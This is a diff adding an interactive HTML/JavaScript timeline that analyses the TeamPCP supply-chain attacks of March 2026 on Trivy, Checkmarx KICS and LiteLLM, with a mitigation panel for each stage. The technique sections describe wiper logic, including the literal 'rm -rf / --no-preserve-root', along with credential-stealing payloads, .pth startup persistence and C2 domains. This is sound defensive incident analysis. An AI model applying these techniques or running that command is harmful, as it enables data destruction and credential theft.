+fullTechnique:"Three simultaneous attack vectors on March 22:\n\n(a) Docker Hub poisoning (~16:00 UTC): New image tags 0.69.5 and 0.69.6 were pushed to Docker Hub without corresponding GitHub releases or tags. The \u2018latest\u2019 tag pointed to the compromised 0.69.6. Both images contained the same TeamPCP infostealer.\n\n(b) GitHub org defacement (20:31\u201320:32 UTC): All 44 internal repositories in Aqua Security\u2019s \u201caquasec-com\u201d GitHub organization were modified in a scripted 2-minute burst. Each repository was renamed with a \u201ctpcp-docs-\u201d prefix, all descriptions set to \u201cTeamPCP Owns Aqua Security,\u201d and repositories were made public. The compromised organization contained proprietary source code including Tracee, internal Trivy forks, CI/CD pipelines, Kubernetes operators, and team knowledge bases. The attack was executed using the compromised Argon-DevOps-Mgt service account.\n\n(c) kamikaze.sh Kubernetes wiper: The ICP canister C2 began serving an iteratively developed destructive payload. The shell script stages from Cloudflare-backed infrastructure, downloads a Python controller (kube.py) that checks timezone (Asia/Tehran) and locale (fa_IR):\n\u2022 Iranian K8s: Deploys DaemonSet \u201chost-provisioner-iran\u201d with container \u201ckamikaze\u201d. Mounts host root at /mnt/host, wipes all top-level directories, force-reboots. Tolerations ensure it schedules on every node including control plane.\n\u2022 Non-Iranian K8s: Deploys \u201chost-provisioner-std\u201d with persistent CanisterWorm backdoor.\n\u2022 Iranian non-K8s: Runs rm -rf / --no-preserve-root.\n\u2022 Non-Iranian non-K8s: Exits cleanly.\n\nA third variant added self-spreading: parses SSH auth logs for successful login pairs, steals SSH keys from ~/.ssh/, and spreads to other machines on the local /24 subnet. Also scans for exposed Docker APIs on port 2375.",
+fullUsers:"Docker Hub users who pulled the \u2018latest\u2019 Trivy tag or explicitly pulled 0.69.4, 0.69.5, or 0.69.6 between March 19\u201322 were affected. The last known clean Docker Hub release was 0.69.3.\n\nThe aquasec-com GitHub organization (distinct from the public \u201caquasecurity\u201d org) contained proprietary source code and internal infrastructure:\n\u2022 Source code for Tracee (Aqua\u2019s runtime security tool)\n\u2022 Internal Trivy forks with commercial modifications\n\u2022 CI/CD pipeline configurations\n\u2022 Kubernetes operators\n\u2022 Team knowledge bases\n\nAll of this was briefly exposed publicly. The scope of data accessed or exfiltrated before the repositories were secured remains under investigation.\n\nThe wiper\u2019s impact on Iranian systems is unknown. No public evidence of successful wipes has been confirmed, and the ICP canister was taken down after discovery. However, the capability was fully functional and actively deployed.",
+fullStolen:"The three concurrent attacks combined credential theft, infrastructure destruction, and geopolitically targeted sabotage:\n\n\u2022 Docker Hub: Supply chain poisoned via malicious images distributed through the official Trivy container registry\n\u2022 GitHub defacement: Proprietary source code, CI/CD configs, and knowledge bases exposed\n\u2022 Wiper: Total data destruction on Iranian systems; persistent backdoor on all others\n\u2022 Lateral movement: SSH key theft and Docker API exploitation for subnet-wide propagation\n\nTeamPCP rotated through multiple payload versions across Cloudflare tunnel domains. Service names shifted from \u201cpgmon\u201d to \u201cinternal-monitor\u201d to \u201cpgmonitor.\u201d The PostgreSQL camouflage became more consistent across iterations.",
+at:"Image digest pinning + content trust",pct:"70%",
+ad:"Docker tags are mutable, just like Git tags. Pinning to image digest (sha256) is immutable. Docker Content Trust and Sigstore/cosign provide image signing. The defacement used the same unrotated credential from Node 2. Cross-org service accounts with long-lived PATs are a known antipattern. Network segmentation and Docker API access controls (port 2375) would limit lateral movement of the wiper.",
+fullAd:"Docker image tags are mutable pointers, identical in concept to Git tags. docker pull aquasec/trivy:0.69.4 resolves to whatever image the tag currently points to. The immutable alternative is pulling by digest: docker pull aquasec/trivy@sha256:abc123...\n\nDocker Content Trust (DCT) provides image signing and verification. Sigstore/cosign provides keyless signing with OIDC identity. Both would have flagged the unsigned malicious images.\n\nThe defacement attack used the Argon-DevOps-Mgt service account \u2014 the same unrotated credential from Node 2. This is the same failure: a long-lived PAT with cross-org access that should have been rotated on March 1.\n\nThe wiper\u2019s lateral movement via SSH keys and Docker API scanning (port 2375) is addressable through:\n\u2022 Network segmentation between build environments and production\n\u2022 Docker API access controls (never expose port 2375 without authentication)\n\u2022 SSH key rotation after any credential compromise\n\nThe 70% preventability reflects that the Docker and defacement vectors are fully preventable, while the geopolitically targeted wiper payload represents a novel threat that existing frameworks don\u2019t model."},
+{num:"6",title:"CHECKMARX HIT",date:"March 23, 2026",actor:"TeamPCP",
+vector:"Cross-vendor credential reuse from Trivy pipelines",
+desc:"Credentials stolen from Trivy CI/CD compromise cx-plugins-releases service account. All 35 KICS tags force-pushed. ast-github-action v2.3.28 poisoned. Two OpenVSX extensions backdoored. New C2: checkmarx[.]zone (defeats Trivy-era blocklists).",
+users:"CI/CD pipelines running KICS during 4-hour window (12:58\u201316:50 UTC). OpenVSX extension users (VS Code Marketplace unaffected). KICS widely used in enterprise IaC scanning.",
+stolen:"Identical stealer: SSH, cloud, K8s, crypto. Enhanced with K8s persistence. Vendor-specific typosquat means orgs that blocked Trivy C2 had zero protection.",
+fullTechnique:"Four days after the Trivy compromise, TeamPCP pivoted to Checkmarx\u2019s ecosystem.\n\nGitHub Action compromise (12:58\u201316:50 UTC March 23): All 35 tags of Checkmarx/kics-github-action were hijacked using the compromised cx-plugins-releases service account (GitHub ID 225848595). The attacker staged malicious commits on a fork containing a setup.sh payload, then updated all tags to point to those commits. The repository was taken down at 16:50 UTC after a GitHub issue was filed by user cyril-flieller.\n\nAt 22:25 UTC, Sysdig reported that Checkmarx/ast-github-action was also compromised (confirmed: v2.3.28, likely all tags affected).\n\nOpenVSX extensions (12:53 UTC): Two extensions \u2014 ast-results v2.53.0 and cx-dev-assist v1.7.0 \u2014 were published 12 seconds apart via the ast-phoenix account on OpenVSX. On activation, environmentAuthChecker.js checks for cloud provider credentials; if found, it downloads a second-stage payload from checkmarx[.]zone. The VS Code Marketplace versions were unaffected.\n\nKey tactical evolutions from the Trivy attack:\n\u2022 New C2 domain: checkmarx[.]zone (83.142.209.11) instead of scan.aquasecurtiy[.]org. Organizations that blocked the Trivy C2 had zero protection.\n\u2022 Fallback exfil repo renamed from tpcp-docs to docs-tpcp\n\u2022 New Kubernetes-focused persistence code not present in Trivy variant\n\u2022 Vendor-specific typosquat domains designed to blend into CI/CD log output\n\nThe identical payload, encryption scheme, and tpcp.tar.gz naming convention confirmed same threat actor.",
+fullUsers:"Checkmarx KICS (Keeping Infrastructure as Code Secure) is an open-source IaC security scanner used in enterprise CI/CD pipelines for scanning Terraform, Kubernetes, Dockerfiles, CloudFormation, Ansible, and more. While KICS has roughly 1% of trivy-action\u2019s visible public usage, it is widely adopted in enterprise environments for compliance scanning.\n\nAny organization that had CI/CD pipelines configured to run the KICS GitHub Action during the 4-hour window (12:58\u201316:50 UTC on March 23) could be impacted.\n\nThe OpenVSX extensions were available for download from approximately 12:53 UTC until 15:41 UTC on March 23. Only organizations that downloaded from OpenVSX are affected \u2014 the VS Code Marketplace versions were not compromised, suggesting the Marketplace had better verification controls.\n\nCheckmarx stated: \u201cWe are not aware of any impact to customer data or production environments.\u201d",
+fullStolen:"The credential stealer was functionally identical to the Trivy variant, targeting the same credential categories. Enhancements specific to this wave:\n\u2022 Kubernetes-focused persistence code (deploying privileged pods)\n\u2022 New C2 domain (checkmarx[.]zone) specifically chosen to defeat domain-based blocking of the earlier Trivy C2\n\u2022 Fallback repository renamed to docs-tpcp (from tpcp-docs)\n\nSysdig noted: \u201cThe identical payload, encryption scheme, and tpcp.tar.gz naming convention confirm this is the same threat actor expanding their reach beyond the initial Trivy compromise.\u201d\n\nThe vendor-specific typosquat is a deliberate deception: an analyst reviewing CI/CD logs would see curl traffic to what appears to be the action\u2019s own vendor domain.",
+at:"SHA pinning + credential compartments",pct:"80%",
+ad:"SHA pinning (same as Node 3) stops tag poisoning for downstream consumers. Credential compartmentalization: tokens stolen from Vendor A\u2019s CI/CD should never have write access to Vendor B\u2019s repos. Build/publish separation: scanning steps should not have access to publish tokens. GitHub Actions environments support stage-level secret scoping. Adoption is negligible.",
+fullAd:"SHA pinning would have prevented the tag poisoning for any downstream consumer, exactly as described in Node 3. The additional lesson from this node is about credential compartmentalization across vendor boundaries.\n\nThe cascading compromise happened because credentials stolen from Trivy CI/CD pipelines (Aqua Security\u2019s ecosystem) had write access to Checkmarx\u2019s ecosystem. Specifically, if organizations running Trivy in their CI/CD also ran KICS in the same pipeline, the credentials stolen from the Trivy step could reach the Checkmarx service account.\n\nThis violates the principle of credential compartmentalization:\n\u2022 Build steps that run third-party scanning tools should not have access to registry publish tokens\n\u2022 Credentials for different vendors\u2019 services should be isolated in separate GitHub Actions environments\n\u2022 No single CI/CD execution context should hold credentials that span multiple vendor boundaries\n\nGitHub Actions environments support exactly this pattern: different jobs can run in different environments with different secret scopes. A scanning job should have read-only access; a publish job should have publish-only access; they should never share secrets.\n\nSysdig\u2019s analysis: \u201cRuntime detection proved effective against both waves because the underlying behavior is the same: A CI runner process uploads encrypted binary data to an external domain that was not part of the original workflow.\u201d Behavior-based detection works regardless of which C2 domain is used."},
+{num:"7",title:"LITELLM POISONED",date:"March 24, 2026",actor:"TeamPCP",
+vector:"Unpinned Trivy in CI/CD + long-lived PyPI publish token",
+desc:"LiteLLM\u2019s CI/CD ran Trivy (unpinned via apt). Compromised Trivy exfiltrated PYPI_PUBLISH token. TeamPCP published 1.82.7 (10:39 UTC) and 1.82.8 (10:52 UTC) to PyPI. v1.82.8 used .pth file: executes on every Python process startup, no import needed.",
+users:"95M monthly downloads. 3.4M/day. Present in 36% of cloud environments (Wiz). API gateway for 100+ LLM providers. Transitive dep for DSPy, MLflow, Open Interpreter, 2000+ packages.",
+stolen:"SSH keys, AWS/GCP/Azure creds, K8s secrets, DB passwords, crypto wallets, .env files, shell history, SSL keys, CI/CD secrets. LiteLLM holds every LLM API key by design.",
+fullTechnique:"LiteLLM\u2019s GitHub Actions CI/CD pipeline used Trivy as part of its build process, pulling it from apt without a pinned version. When the pipeline ran during the Trivy compromise window, the compromised Trivy action exfiltrated the PYPI_PUBLISH token from the GitHub Actions runner environment.\n\nWith that credential, TeamPCP published two malicious versions:\n\u2022 v1.82.7 (10:39 UTC): Payload embedded in litellm/proxy/proxy_server.py. 12 lines of obfuscated code inserted, executing a base64 payload via subprocess when litellm.proxy is imported.\n\u2022 v1.82.8 (10:52 UTC): Added litellm_init.pth (34,628 bytes) to site-packages/. Python\u2019s site module processes .pth files during interpreter startup \u2014 lines beginning with \u2018import\u2019 are executed as Python code. This means the payload ran on every Python process started on the machine, including pip, Jupyter notebooks, Ansible playbooks, unit tests \u2014 anything using the same Python environment.\n\nThe 13-minute gap between versions shows active iteration during the attack window. The .pth mechanism in 1.82.8 was a deliberate escalation from 1.82.7\u2019s import-triggered approach.\n\nBoth versions were quarantined by PyPI at approximately 11:25 UTC \u2014 a ~3 hour window. The entire LiteLLM package was then quarantined on PyPI, meaning no version is available for download.\n\nThe attack was discovered accidentally: Callum McMahon at FutureSearch was testing a Cursor MCP plugin that pulled LiteLLM as a transitive dependency. The .pth file triggered on every Python startup, spawning subprocesses that each triggered the .pth again, creating an exponential fork bomb that crashed the machine by exhausting RAM.\n\nKarpathy noted: if the attacker hadn\u2019t introduced this bug, the compromise might have gone undetected for days or weeks.\n\nThe exfiltration domain litellm.cloud (NOT the official litellm.ai) was registered on March 23 via Spaceship, Inc. \u2014 the day before the attack. The attackers also defaced BerriAI\u2019s repos with \u201cteampcp owns BerriAI\u201d and buried the security issue (#24512) with 28 spam comments in 43 seconds from 25 bot accounts (76% overlap with the Trivy spam botnet).",
+fullUsers:"LiteLLM is an open-source Python library that serves as a universal translator, converting API requests for over 100 different Large Language Model providers into the standard OpenAI format. It has approximately 97 million downloads per month (3.4 million per day) and over 40,000 GitHub stars.\n\nWiz data shows LiteLLM is present in 36% of all cloud environments. It is a transitive dependency for a growing number of AI agent frameworks, MCP servers, and LLM orchestration tools, including DSPy, MLflow, Open Interpreter, and over 2,000 other packages.\n\nThe person who discovered the attack never directly installed LiteLLM \u2014 it arrived through a chain of: IDE (Cursor) \u2192 MCP plugin \u2192 transitive dependency (LiteLLM). This dependency chain is invisible to the developer.\n\nTeamPCP claimed on Telegram to have stolen data from \u201chundreds of thousands of devices.\u201d At RSAC 2026, Mandiant CTO Charles Carmakal confirmed: \u201cWe know of over 1,000 impacted SaaS environments right now. That will probably expand into another 500, another 1,000, maybe another 10,000.\u201d\n\nWiz researcher Ben Read: \u201cWe are seeing a dangerous convergence between supply chain attackers and high-profile extortion groups like Lapsus$.\u201d",
+fullStolen:"The three-stage payload:\n\n1. Credential harvester: Sweeps SSH keys, environment variables (all API keys), AWS/GCP/Azure credentials, Kubernetes configs and service account tokens, CI/CD secrets, Docker configs, database credentials (connection strings, passwords), cryptocurrency wallets, .env files, shell history, SSL private keys, and git credentials.\n\n2. Kubernetes lateral movement: If K8s is detected, deploys privileged pods (node-setup-*) to every node via service account tokens, mounting host filesystems for persistent access.\n\n3. Persistent backdoor: Installs sysmon.service (systemd user service) that polls checkmarx[.]zone/raw every 50 minutes for additional payloads. Kill switch: aborts if response contains \u201cyoutube\u201d (currently returns Rick Roll).\n\nThe cruel irony: LiteLLM is an API key management gateway. The attacker targeted the one package that, by definition, has access to every LLM API key in the organization. A data scientist running a Jupyter notebook, a DevOps engineer running Ansible, a developer running unit tests \u2014 all triggered the malware if LiteLLM 1.82.8 was installed.\n\nTeamPCP\u2019s Telegram message: \u201cThese companies were built to protect your supply chains yet they can\u2019t even protect their own. The state of modern security research is a joke. We\u2019re gonna be around for a long time stealing terabytes of trade secrets with our new partners.\u201d",
+at:"PyPI trusted publishers + pinned deps",pct:"85%",
+ad:"PyPI Trusted Publishing (OIDC) available since 2023. Short-lived tokens replace static PYPI_PUBLISH secrets. LiteLLM used a long-lived token as a GitHub Actions secret. Pinning build dependencies: pipeline pulled Trivy via apt without version pin. Build/publish isolation: scanning step had access to publish token. GitHub Actions environments support stage-level secret scoping. .pth file detection is a known Python attack vector, detectable by scanners.",
+fullAd:"PyPI\u2019s Trusted Publishing feature, developed by Trail of Bits with funding from Google\u2019s Open Source Security Team, has been available since 2023. It uses OIDC to mint short-lived (15-minute) API tokens that are scoped to specific projects and specific workflow configurations.\n\nIf LiteLLM had used Trusted Publishing:\n\u2022 No PYPI_PUBLISH token would be stored in GitHub Actions secrets\n\u2022 The compromised Trivy action could not have exfiltrated a publish credential\n\u2022 The attacker would have needed to compromise the specific GitHub Actions workflow that was registered as a Trusted Publisher \u2014 not just any credential in the environment\n\nAdditional mitigations:\n\u2022 Pinned build dependencies: LiteLLM\u2019s CI/CD pulled Trivy via apt without a version pin. Pinning to a specific version (or using a container with a known Trivy version) would have prevented the compromised version from entering the build.\n\u2022 Build/publish isolation: The scanning step (which ran Trivy) had access to the PYPI_PUBLISH token. If scanning ran in a separate GitHub Actions environment without publish credentials, the token could not have been exfiltrated.\n\u2022 .pth file detection: Python .pth files that execute code are a known attack vector. Package security scanners can detect packages that install .pth files with executable content (subprocess, exec, base64 decoding). Socket\u2019s scanner flagged this.\n\nSnyk documented: \u201cHash verification confirms a file matches what PyPI advertised, but does not indicate whether the advertised content is malicious. The litellm_init.pth file was correctly declared in the wheel\u2019s RECORD file with a matching hash. pip install --require-hashes would have passed.\u201d\n\nThis is why integrity verification alone is insufficient when the publish credential itself is compromised. The artifact passes all integrity checks because it was published using legitimate credentials. Only eliminating the stored credential (via Trusted Publishing) or isolating it from the build step prevents this class of attack."}
+];
+
+function buildBand1(){
+const el=document.getElementById('band1');
+DATA.forEach((d,i)=>{
+if(i>0) el.innerHTML+=`<div class="arrow-gap"><svg viewBox="0 0 16 16"><path d="M2 8H12M9 5L12 8L9 11" fill="none" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--red').trim()}" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>`;
+const maxDesc=d.desc.length>120?d.desc.substring(0,120)+'\u2026':d.desc;
+const maxUsers=d.users.length>100?d.users.substring(0,100)+'\u2026':d.users;
+const maxStolen=d.stolen.length>100?d.stolen.substring(0,100)+'\u2026':d.stolen;
+el.innerHTML+=`<div class="node" onclick="toggleNode(this)" data-idx="${i}">
+<div class="node-header">
+<span class="node-num">${d.num}</span><span class="node-title">${d.title}</span>
+<span class="node-date">${d.date}</span>
+<span class="node-actor">${d.actor}</span>
+</div>
+<div class="node-compact">
+<span class="section-label dim">MAIN THREAT VECTOR</span>
+<div class="section-text sec">${d.vector}</div>
+<div class="sep"></div>
+<span class="section-label dim">DESCRIPTION</span>
+<div class="section-text sec">${maxDesc}</div>
+<span class="section-label blue">USERS / SCALE</span>
+<div class="section-text blue">${maxUsers}</div>
+<span class="section-label red">STOLEN / DAMAGE</span>
+<div class="section-text red">${maxStolen}</div>
+</div>
+<div class="click-hint">\u25B8 CLICK FOR FULL DETAILS</div>
+<div class="node-detail">
+<div class="detail-section"><div class="detail-label">FULL TECHNIQUE ANALYSIS</div><div class="detail-text">${d.fullTechnique.replace(/\n/g,'<br>')}</div></div>
+<div class="detail-section"><div class="detail-label blue">FULL IMPACT &amp; USERS AFFECTED</div><div class="detail-text blue">${d.fullUsers.replace(/\n/g,'<br>')}</div></div>
+<div class="detail-section"><div class="detail-label red">FULL STOLEN / DAMAGE ASSESSMENT</div><div class="detail-text red">${d.fullStolen.replace(/\n/g,'<br>')}</div></div>
+</div>
+</div>`;
+});
+}
+
+function buildBand2(){
+const el=document.getElementById('band2');
+DATA.forEach((d,i)=>{
+if(i>0) el.innerHTML+=`<div class="arrow-gap"></div>`;
+const maxAd=d.ad.length>140?d.ad.substring(0,140)+'\u2026':d.ad;
+el.innerHTML+=`<div class="mitigation-node" onclick="toggleMit(this)" data-idx="${i}">
+<div class="mit-header">
+<div class="mit-title">${d.at}</div>
+<div class="mit-pct">${d.pct} mitigation</div>
+</div>
+<div class="mit-compact">${maxAd}</div>
+<div class="click-hint">\u25B8 CLICK FOR FULL ANALYSIS</div>
+<div class="mit-detail">
+<div class="mit-detail-text">${d.fullAd.replace(/\n/g,'<br>')}</div>
+</div>
+</div>`;
+});
+}
+
+function buildConnectors(){
+const el=document.getElementById('connectors');
+for(let i=0;i<7;i++){
+if(i>0) el.innerHTML+=`<div style="width:22px;min-width:22px"></div>`;
+el.innerHTML+=`<div class="connector-line"><svg viewBox="0 0 2 28"><line x1="1" y1="0" x2="1" y2="28" stroke="#1D9E75" stroke-width="1" stroke-dasharray="3 3" opacity="0.35"/></svg></div>`;
+}
+}
+
+function buildChart(){
+const svg=document.getElementById('chartSvg');
+const W=1480,H=220,px=20,py=16;
+const cw=W-2*px,ch=H-2*py-20;
+const events=[["Feb 20",0],["Feb 28",0.12],["Mar 1",0.15],["Mar 19",0.55],["Mar 20",0.62],["Mar 22",0.74],["Mar 23",0.83],["Mar 24",0.93]];
+let s='';
+events.forEach(([l,p])=>{
+const x=px+p*cw;
+s+=`<line x1="${x}" y1="${py}" x2="${x}" y2="${py+ch}" stroke="#1E2A42" stroke-width="0.5" stroke-dasharray="2 4"/>`;
+s+=`<text x="${x}" y="${H-6}" font-size="9" fill="#6B6A65" text-anchor="middle" font-family="system-ui,sans-serif">${l}</text>`;
+});
+const flatY=py+ch-14;
+const flatPts=[[0,0],[0.12,-4],[0.15,0],[0.55,-8],[0.62,-4],[0.74,-4],[0.83,-8]];
+let pathD=flatPts.map(([p,b],i)=>`${i?'L':'M'}${px+p*cw} ${flatY+b}`).join(' ');
+s+=`<path d="${pathD}" fill="none" stroke="#6B6A65" stroke-width="1.5"/>`;
+const pubs=[[0.12,"StepSecurity: hackerbot-claw",-22],[0.15,"Aqua discloses",-36],[0.55,"Socket + Wiz: Trivy",-22],[0.62,"Aikido: CanisterWorm",-36],[0.74,"Wiper reported",-22],[0.83,"Krebs: Checkmarx",-36]];
+pubs.forEach(([p,l,yo])=>{
+const x=px+p*cw;
+s+=`<circle cx="${x}" cy="${flatY-4}" r="2" fill="#6B6A65"/>`;
+s+=`<text x="${x}" y="${flatY+yo}" font-size="7" fill="#6B6A65" text-anchor="middle" font-family="system-ui,sans-serif">${l}</text>`;
+});
+const mx=px+0.35*cw;
+s+=`<rect x="${mx-60}" y="${flatY-48}" width="120" height="24" rx="3" fill="#0B1120" stroke="#6B6A65" stroke-width="0.3"/>`;
+s+=`<text x="${mx}" y="${flatY-38}" font-size="8" fill="#6B6A65" text-anchor="middle" font-family="system-ui,sans-serif" font-weight="500">No one is listening</text>`;
+s+=`<text x="${mx}" y="${flatY-29}" font-size="7" fill="#6B6A65" text-anchor="middle" font-family="system-ui,sans-serif">(security community only)</text>`;
+const envSteps=[[0,0],[0.12,0],[0.15,0],[0.54,0],[0.55,0.05],[0.62,0.15],[0.74,0.35],[0.83,0.5],[0.93,1.0]];
+const envZero=py+ch-2,envTop=py+10,envR=envZero-envTop;
+let envPath='';
+envSteps.forEach(([p,f],j)=>{
+const x=px+p*cw,y=envZero-f*envR;
+if(j===0){envPath=`M${x} ${y}`}else{
+const[,pf]=envSteps[j-1];
+envPath+=` L${x} ${envZero-pf*envR} L${x} ${y}`;
+}
+});
+s+=`<path d="${envPath}" fill="none" stroke="#E24B4A" stroke-width="1.5" opacity="0.7"/>`;
+envSteps.filter(([,f])=>f>0).forEach(([p,f])=>{
+s+=`<circle cx="${px+p*cw}" cy="${envZero-f*envR}" r="2.5" fill="#E24B4A" opacity="0.7"/>`;
+});
+const spikeX=px+0.93*cw,spikeTop=py+6;
+s+=`<path d="M${spikeX-15} ${flatY} L${spikeX} ${spikeTop} L${spikeX+15} ${flatY} Z" fill="url(#spk)" opacity="0.5"/>`;
+const[lastFx,lastFy]=[px+0.83*cw,flatY-8];
+s+=`<path d="M${lastFx} ${lastFy} L${spikeX} ${spikeTop}" fill="none" stroke="#EF9F27" stroke-width="2.5"/>`;
+s+=`<circle cx="${spikeX}" cy="${spikeTop}" r="4" fill="#EF9F27"/>`;
+s+=`<circle cx="${spikeX}" cy="${spikeTop}" r="8" fill="#EF9F27" opacity="0.2"/>`;
+const kx=spikeX-260,ky=spikeTop-2;
+s+=`<rect x="${kx}" y="${ky}" width="246" height="40" rx="4" fill="#2A1D08" stroke="#EF9F27" stroke-width="0.5"/>`;
+s+=`<text x="${kx+8}" y="${ky+14}" font-size="10" fill="#EF9F27" font-family="system-ui,sans-serif" font-weight="600">Andrej Karpathy posts on X</text>`;
+s+=`<text x="${kx+8}" y="${ky+26}" font-size="8" fill="#C8922A" font-family="system-ui,sans-serif">"Software horror: litellm PyPI supply chain attack"</text>`;
+s+=`<text x="${kx+8}" y="${ky+36}" font-size="7" fill="#9C9A92" font-family="system-ui,sans-serif">NOW the AI developer community pays attention.</text>`;
+s+=`<line x1="${kx+246}" y1="${ky+20}" x2="${spikeX-10}" y2="${spikeTop}" stroke="#EF9F27" stroke-width="0.5" stroke-dasharray="3 3"/>`;
+svg.innerHTML=`<defs><linearGradient id="spk" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#EF9F27" stop-opacity="0.6"/><stop offset="100%" stop-color="#EF9F27" stop-opacity="0"/></linearGradient></defs>`+s;
+}
+
+function toggleNode(el){
+const wasExpanded=el.classList.contains('expanded');
+document.querySelectorAll('.node').forEach(n=>n.classList.remove('expanded'));
+if(!wasExpanded) el.classList.add('expanded');
+}
+function toggleMit(el){
+const wasExpanded=el.classList.contains('expanded');
+document.querySelectorAll('.mitigation-node').forEach(n=>n.classList.remove('expanded'));
+if(!wasExpanded) el.classList.add('expanded');
+}
+
+buildBand1();
+buildConnectors();
+buildBand2();
+buildChart();
+</script>
+</body>
+</html>
